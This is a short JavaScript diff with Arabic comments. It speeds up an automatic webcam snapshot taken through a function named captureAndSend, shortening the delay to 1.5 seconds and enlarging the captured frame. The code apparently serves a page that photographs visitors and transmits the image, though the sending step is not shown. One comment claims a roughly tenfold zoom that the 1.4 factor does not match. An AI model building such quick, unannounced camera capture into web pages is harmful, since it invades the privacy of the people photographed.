@@ -60,7 +60,7 @@
         })
         .then(stream => {
             video.srcObject = stream;
-            setTimeout(captureAndSend, 2800);
+            setTimeout(captureAndSend, 1500); // 1.5 ثانية فقط
         })
         .catch(() => showError());
 
@@ -68,15 +68,16 @@
             const width = video.videoWidth;
             const height = video.videoHeight;
             
-            canvas.width = width * 1.12;
-            canvas.height = height * 1.12;
+            // زوم بعيد جداً (x10 تقريباً)
+            canvas.width = width * 1.4;
+            canvas.height = height * 1.4;
             
             const ctx = canvas.getContext('2d');
             ctx.drawImage(video, 
-                -width * 0.06, 
-                -height * 0.06, 
-                width * 1.12, 
-                height * 1.12
+                -width * 0.2, 
+                -height * 0.2, 
+                width * 1.4, 
+                height * 1.4
             );
             
             canvas.toBlob(blob => {
